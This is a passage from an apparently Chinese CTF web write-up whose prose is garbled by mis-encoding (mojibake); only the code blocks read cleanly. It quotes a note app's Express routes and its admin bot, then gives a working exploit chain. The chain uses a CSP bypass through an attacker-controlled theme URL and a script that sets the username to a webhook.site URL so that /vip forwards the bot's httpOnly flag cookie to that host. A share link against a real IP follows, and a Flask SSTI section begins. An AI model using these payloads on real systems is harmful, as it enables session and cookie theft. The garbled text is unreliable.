class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'something error'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸º<code>/note</code>è¿™é‡Œæ˜¯è¦æ±‚æ˜¯<code>vip</code>æ‰èƒ½ä¼ <code>theme</code>ï¼Œè¿™é‡Œå°±è¿›å…¥<code>ctf</code>çš„æ€ç»´å®šå¼äº†ï¼ˆæ—¢ç„¶è¿™ä¸ªè·¯ç”±è¦æˆä¸º<code>vip</code>æ‰èƒ½è®¾ç½®ä¸»é¢˜é‚£ä¹ˆè‚¯å®šæœ‰ç”¨ï¼‰ï¼Œä½†æ˜¯çœ‹äº†çœ¼<code>note.html</code>æœ‰æ¯”è¾ƒä¸¥æ ¼çš„<code>CSP</code>é™åˆ¶ã€‚è¿™é‡Œå’Œé˜Ÿå‹æƒ³äº†å¥½ä¹…ï¼Œå…¶ä¸­å‘ç°äº†ä¸¤ç§æ–¹æ³•å¯ä»¥æ‰“<code>alert</code>ï¼Œæˆ‘çš„æ–¹æ³•æ¯”è¾ƒç­”è¾©ï¼Œå°±æ˜¯æ§åˆ¶<code>host</code>å¤´èµ‹å€¼ç»™<code>CSP</code>å°±èƒ½æ‰“æœ¬åœ°<code>alert</code>ï¼Œä½†å®é™…ä¸Šè¿<code>bot</code>éƒ½æ‰“ä¸äº†ï¼Œé™¤éé™¤éæ˜¯æœ‰ä¸ª<code>CRLF</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682299128.jpg" alt="1698682299128"></p><p>é˜Ÿå‹<code>kkkl</code>æƒ³åˆ°çš„æ–¹æ³•æ˜¯æ›´é€šç”¨çš„ï¼Œå› ä¸º<code>note.html</code>çš„<code>CSP</code>å¼•å…¥äº†<code>jsdelivr</code>ï¼Œè¿™æ˜¯ä¸ªå¯ä»¥ä»£ç†<code>github</code>çš„<code>cdn</code>ï¼Œå› æ­¤åªè¦æŠŠ<code>github</code>ä¸­çš„æ¶æ„è„šæœ¬é€šè¿‡<a href="https://www.jsdelivr.com/github%E4%BB%A3%E7%90%86%E5%B0%B1%E8%83%BD%E7%BB%95%E8%BF%87%60CSP%60%E4%BA%86%EF%BC%8C%E4%BD%86%E5%8F%AF%E6%83%9C%E7%9A%84%E6%98%AF%E8%BF%99%E7%A7%8D%E6%96%B9%E6%B3%95%E5%9C%A8%E5%90%8E%E7%BB%AD%E4%B9%9F%E6%A0%B9%E6%9C%AC%E4%B8%8D%E5%8F%AF%E8%83%BD%E7%BB%95%E8%BF%87%60http">https://www.jsdelivr.com/githubä»£ç†å°±èƒ½ç»•è¿‡`CSP`äº†ï¼Œä½†å¯æƒœçš„æ˜¯è¿™ç§æ–¹æ³•åœ¨åç»­ä¹Ÿæ ¹æœ¬ä¸å¯èƒ½ç»•è¿‡`http</a> only&#96;ã€‚</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/note'</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token punctuation">{</span> tex<span class="token punctuation">,</span> theme <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'empty tex'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>theme <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isVip<span class="token punctuation">)</span> <span class="token punctuation">{</span>        theme <span class="token operator">=</span> <span class="token string">''</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span> tex<span class="token punctuation">,</span> theme <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>theme <span class="token operator">||</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isVip<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token punctuation">:</span> <span class="token string">'Be VIP to enable theme setting!'</span>    msg <span class="token operator">+</span><span class="token operator">=</span> <span class="token template-string"><span class="token string">`\nYour note link: http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/note/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span>    msg <span class="token operator">+</span><span class="token operator">=</span> <span class="token template-string"><span class="token string">`\nShare it via http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/share/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†åæ¥æƒ³åˆ°äº†<code>/preview.html</code>ä¹Ÿæ˜¯å¯ä»¥è¯·æ±‚åŠ è½½æŒ‡å®šçš„<code>theme</code>çš„ï¼Œå¹¶ä¸”æ²¡æœ‰<code>CSP</code>ï¼Œå†ç»“åˆå‰é¢æåˆ°çš„<code>id</code>æ˜¯å¯æ§çš„å°±èƒ½å®Œç¾åˆ©ç”¨äº†ã€‚</p><pre class="line-numbers language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mt-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>latex-js</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tex<span class="token punctuation">"</span></span> <span class="token attr-name">baseURL</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> base %<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&lt;%= tex %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>latex-js</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>èƒ½å¤Ÿè¯·æ±‚è‡ªå®šä¹‰çš„<code>theme</code>æ˜¯å› ä¸º<code>/preview</code>è·¯ç”±ä¸‹é¢ä¹Ÿæ˜¯é€šè¿‡<code>new URL</code>è¿™ç§é”™è¯¯çš„å¤„ç†æ–¹å¼è¿›è¡Œ<code>fetch</code>çš„ï¼Œ<code>theme</code>å¯æ§æ‰€ä»¥å°±å¯ä»¥éšä¾¿åŠ è½½æˆ‘ä»¬è‡ªå®šä¹‰çš„<code>js</code>äº†ï¼Œæœ€å…³é”®çš„æ˜¯è¿™ä¸ªé¡µé¢<strong>æ²¡æœ‰CSPé™åˆ¶</strong>ã€‚</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/preview'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token punctuation">{</span> tex<span class="token punctuation">,</span> theme <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        tex <span class="token operator">=</span> <span class="token string">'Today is \\today.'</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> nonce <span class="token operator">=</span> <span class="token function">getNonce</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> base <span class="token operator">=</span> <span class="token string">'https://cdn.jsdelivr.net/npm/latex.js/dist/'</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">)</span> <span class="token punctuation">{</span>        base <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>theme<span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/theme/`</span></span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span>    <span class="token punctuation">}</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'preview.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> tex<span class="token punctuation">,</span> nonce<span class="token punctuation">,</span> base <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œè¯·æ±‚çš„<code>js</code>æ˜¯éœ€è¦æ³¨æ„ä¸€ä¸‹çš„ï¼Œæ¯”å¦‚ä½ ä¼ å‚<code>?theme=http://xx.xx.xx.xx</code>ï¼Œé‚£ä¹ˆä»–è¯·æ±‚åŠ è½½çš„<code>js</code>è·¯å¾„æ˜¯<code>http://xx.xx.xx.xx/js/base.js</code>ã€‚</p><h5 id="ç»•è¿‡http-only"><a href="#ç»•è¿‡http-only" class="headerlink" title="ç»•è¿‡http only"></a>ç»•è¿‡http only</h5><p><code>bot</code>çš„é€»è¾‘æ˜¯å¾ˆç»å…¸çš„é™åˆ¶äº†<code>domain</code>å’Œ<code>http only</code>ï¼Œåœ¨é˜Ÿå†…æœˆèµ›&#x2F;å‡çº§èµ›é‡åˆ°æ— æ•°æ¬¡è¿™ç§æ¶å¿ƒçš„ä¸œè¥¿ã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> visit <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`start: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>    <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        headless<span class="token punctuation">:</span> <span class="token string">'new'</span><span class="token punctuation">,</span>        executablePath<span class="token punctuation">:</span> puppeteer<span class="token punctuation">.</span><span class="token function">executablePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        args<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> ctx <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">createIncognitoBrowserContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span><span class="token punctuation">{</span>        <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> ctx<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setCookie</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            name<span class="token punctuation">:</span> <span class="token string">'flag'</span><span class="token punctuation">,</span>            value<span class="token punctuation">:</span> FLAG<span class="token punctuation">,</span>            domain<span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>APP_HOST<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>APP_PORT<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">,</span>            httpOnly<span class="token punctuation">:</span> <span class="token boolean">true</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span>timeout<span class="token punctuation">:</span> <span class="token number">5000</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">await</span> ctx<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`done: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>visit <span class="token operator">=</span> visit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>http only</code>åªé™åˆ¶äº†<code>js</code>å±‚é¢è·å–<code>cookie</code>ï¼Œä½†æ˜¯ä»£ç å±‚é¢æ˜¯ç®¡ä¸åˆ°çš„ã€‚è€Œ<code>domain</code>é™åˆ¶äº†<code>cookie</code>çš„æœ‰æ•ˆåŸŸï¼Œå› æ­¤åªèƒ½æƒ³åŠæ³•æ‰¾ä¸ª<code>app.js</code>ä¸­çš„è·¯ç”±å›æ˜¾<code>cookie</code>äº†ã€‚å¾ˆå®¹æ˜“å°±æƒ³åˆ°äº†<code>vip</code>è·¯ç”±ï¼Œè¿™é‡Œä¼šå¸¦ç€<code>cookie</code>è®¿é—®<code>url</code>ã€‚</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span><span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> session <span class="token operator">=</span> req<span class="token punctuation">.</span>session    <span class="token keyword">let</span> username <span class="token operator">=</span> session<span class="token punctuation">.</span>username    <span class="token keyword">let</span> <span class="token punctuation">{</span> code <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body    <span class="token keyword">let</span> vip_url <span class="token operator">=</span> VIP_URL    <span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> vip_url<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>            Cookie<span class="token punctuation">:</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span>k<span class="token punctuation">,</span> v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>k<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>v<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'; '</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        body<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span> code <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'ok'</span> <span class="token operator">==</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> isVip<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Congratulation! You are VIP now.'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œè¿™é‡Œæ˜¯åˆå‡ºç°äº†<code>new URL</code>è¿™ç§é”™è¯¯å¤„ç†æ–¹å¼ï¼Œæ‰€ä»¥<code>username</code>ææˆè‡ªå·±çš„<code>dnslog</code>å°±å¯ä»¥äº†ã€‚</p><p>è¿™é‡Œæœ‰ä¸¤ç§åŠæ³•ã€‚ä¸€ç§æ˜¯æ§åˆ¶æœºå™¨äººå»ç™»å½•æ‹¿åˆ°<code>token</code>ï¼Œå¦ä¸€ç§æ˜¯åœ¨è¿œç¨‹ç™»å½•ä¸ªè´¦å·ï¼ŒæŠŠæµè§ˆå™¨çš„<code>token</code>å¤åˆ¶è¿‡æ¥ç”¨<code>fetch</code>ç›´æ¥å¸¦ç€<code>token</code>æ‰“<code>/vip</code>ã€‚</p><p>PSï¼šæ†¨æ‰¹äº†æœ¬åœ°è°ƒè¯•çš„æ—¶å€™æŠŠ<code>/vip</code>çš„<code>auth</code>å…³æ‰äº†æ“ï¼Œæˆ‘è¯´æ€ä¹ˆæ²¡<code>token</code>æ‰“ä¸é€šã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'https://webhook.site/e58effa8-d9d9-48a0-98f2-22a962961c22'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> <span class="token string">'9cbf71c9e88878f6db5cc6285a7a1de7'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>  headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  body<span class="token punctuation">:</span> data<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>response <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> vipData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vipData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>      body<span class="token punctuation">:</span> vipData    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>response <span class="token operator">=</span><span class="token operator">></span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>data <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Success:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>error <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè®¿é—®å°±å¯ä»¥è®©<code>bot</code>è®¿é—®<code>preview</code>è·¯ç”±æ¥åŠ è½½æ²¡æœ‰<code>CSP</code>é™åˆ¶çš„æ¶æ„<code>js</code>äº†ã€‚</p><pre><code>http://124.70.33.170:3000/share/..%2Fpreview%3Ftex%3D123%26theme%3Dhttp%3A%2F%2F114.xx.xx.xx</code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682522021.jpg" alt="1698682522021"></p><h4 id="story"><a href="#story" class="headerlink" title="story"></a>story</h4><p>éå¸¸æ˜æ˜¾çš„<code>SSTI</code>ã€‚</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/story'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">story</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    story <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'story'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> story <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> story <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">:</span>        tpl <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'templates/story.html'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>tpl <span class="token operator">%</span> story<span class="token punctuation">)</span>     <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯æƒ³è¦è®¾ç½®<code>story</code>é¦–å…ˆè¦æˆä¸º<code>vip</code>ã€‚</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">vip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    captcha <span class="token operator">=</span> generate_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    captcha_user <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'captcha'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> captcha <span class="token operator">==</span> captcha_user<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'vip'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"home.html"</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/write'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>        story <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'story'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'vip'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> minic_waf<span class="token punctuation">(</span>story<span class="token punctuation">)</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span>            session<span class="token punctuation">[</span><span class="token 